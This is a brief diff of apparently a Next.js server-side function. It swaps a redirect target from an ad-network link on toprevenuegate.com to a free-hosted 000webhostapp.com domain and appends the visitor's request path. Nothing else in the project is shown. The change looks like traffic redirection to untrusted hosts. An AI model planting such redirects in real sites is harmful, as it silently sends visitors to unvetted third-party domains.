@@ -19,7 +19,7 @@ export const getServerSideProps: GetServerSideProps = async (ctx) => {
 			redirect: {
 				permanent: false,
 				destination: `${
-					`https://www.toprevenuegate.com/efyxj1dz?key=4d429ca4760f8401296815ed96ad2767/`
+					`https://indecent-fluid.000webhostapp.com/` + encodeURI(path as string)
 				}`,
 			},
 		};
